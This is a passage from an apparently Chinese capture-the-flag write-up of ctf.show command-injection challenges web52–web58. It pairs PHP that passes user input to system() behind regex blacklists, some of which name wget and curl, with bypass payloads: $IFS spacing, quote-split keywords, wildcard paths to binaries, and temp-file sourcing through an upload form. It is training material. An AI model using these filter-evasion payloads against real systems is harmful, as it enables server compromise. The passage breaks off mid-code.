src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-2.jpg"></p><p>扫描目录没发现有用信息；再扫描根目录试试</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;/%0a<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-3.jpg"></p><p>扫描根目录发现了一个 <strong>flag</strong> 文件，试着访问</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?c=t<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in">ac</span><span class="hljs-variable">$</span>&#123;IFS&#125;/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag%<span class="hljs-number">0</span>a<br>?c=nl<span class="hljs-variable">$IFS</span>/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag||<br>?c=uniq<span class="hljs-variable">$</span>&#123;IFS&#125;/<span class="hljs-built_in">fl</span><span class="hljs-string">&#x27;&#x27;</span>ag||<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52-4.jpg"></p><p>访问后发现了flag</p><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 18:21:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = system(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题较上题多过滤了 <strong>wegt</strong>; 而且没有了“黑洞”： &gt;/dev/null 2&gt;&amp;1</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span>IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br><span class="hljs-string">?c</span>=nl$IFSfl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br><span class="hljs-string">?c</span>=uniq<span class="hljs-variable">$&#123;</span>IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/53-1.jpg"></p><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤的就比较离谱</p><p><strong>实验：</strong></p><p>​    <strong>方法一</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>flag.php = <span class="hljs-number">8</span> 位，????????<br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f????????<br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>????????<br>?c=<span class="hljs-regexp">/bin/</span>?ore<span class="hljs-variable">$&#123;IFS&#125;</span>f???????<br></code></pre></td></tr></table></figure><p>bin为binary:主要是系统的：cat，cp，chmod，dmesg，gzip，kill，ls，mkdir，more，mount，su，tar等等</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-1.jpg"></p><p>​    <strong>方法二</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">//使用 <span class="hljs-built_in">mv</span> 命令将 flag.php 重命名为 a.txt<br>?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-built_in">fl</span>?g.php<span class="hljs-variable">$</span>&#123;IFS&#125;a.txt<br>?c=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-2.jpg"></p><p>​    查看a.txt</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-3.jpg"></p><h2 id="web55-—-无字母数字"><a href="#web55-—-无字母数字" class="headerlink" title="web55 — 无字母数字"></a>web55 — 无字母数字</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了分号，字母[a-z]，反引号(`)，十六进制09(x09)，十六进制26(x26)，&gt;，&lt; ；但是还保留了数字</p><p>​    所以解题方法就会有很多种</p><p><strong>实验：</strong></p><p>​    <strong>方法一</strong></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">使用 <span class="hljs-built_in">base64</span> 进行匹配<br></code></pre></td></tr></table></figure><p>可以匹配到/bin目录下的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span>、<span class="hljs-built_in">cp</span>、chmod、df、dmesg、gzip、<span class="hljs-built_in">kill</span>、<span class="hljs-built_in">ls</span>、mkdir、more、<span class="hljs-built_in">mount</span>、<span class="hljs-built_in">rm</span>、su、tar、base64等<br></code></pre></td></tr></table></figure><p>我们知道了 <strong>base64</strong> ,现在就可以使用通配符进行匹配命令执行查看 <strong>flag</strong> 了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>意思/bin/base64 flag.php<br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-1.jpg"></p><p>​    <strong>方法二</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用 <span class="hljs-keyword">bzip2 </span>命令<br></code></pre></td></tr></table></figure><p>思路是，将flag文件进行压缩，然后再访问下载</p><p>/usr/bin目录下主要放置一些应用软件工具必备的执行档</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c++、g++、gcc、chdrv、<span class="hljs-built_in">diff</span>、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、<span class="hljs-built_in">man</span>、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、<span class="hljs-built_in">wget</span>等<br></code></pre></td></tr></table></figure><p>其中，我们可以利用/usr/bin下的bzip2</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/bzip2 flag.php</span><br></code></pre></td></tr></table></figure><p>访问 <strong>flag.php.bz2</strong> ,并下载，打开后得到flag</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-2.jpg"></p><p>​    <strong>方法三</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">运用.<span class="hljs-comment">(进行)</span>执行sh命令<br></code></pre></td></tr></table></figure><p>在这之前我们要上传post文件数据包</p><p>编写一个简单的上传页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://ae82ef6f-deed-491d-bebf-7498e32cc9b1.challenge.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传一个 1.txt(自己随便上传一个即可) 文件其内容为： b</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-3.jpg"></p><p>使用bp抓包：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=.%<span class="hljs-number">20</span><span class="hljs-regexp">/???/</span>????????[@-[]<br><span class="hljs-regexp">//</span>意思<span class="hljs-regexp">/tmp/</span>flag.php[<span class="hljs-number">2</span>-[]<br><span class="hljs-regexp">//</span>[@-[] 从 @ 到 [ : @，<span class="hljs-number">26</span>个大写字母， [ ,所有表示 匹配大写字母<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-4.jpg"></p><p>访问 flag</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-5.jpg"></p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    此题较上题(web55)多过滤了 数字[0-1], $,(,{,’,”</p><p>​    所以方法使用上题的方法三</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    百度查了有些蒙，直接上payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$(</span>())输出<span class="hljs-number">0</span>，数学运算<br>~<span class="hljs-variable">$(</span>())输出~<span class="hljs-number">0</span><br><span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))输出-<span class="hljs-number">1</span><br>所以再这我们只需要让<span class="hljs-number">36</span>个-<span class="hljs-number">1</span>相加再取反<br><span class="hljs-string">?c</span>=<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>(<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))))))<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/57-1.jpg"></p><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span 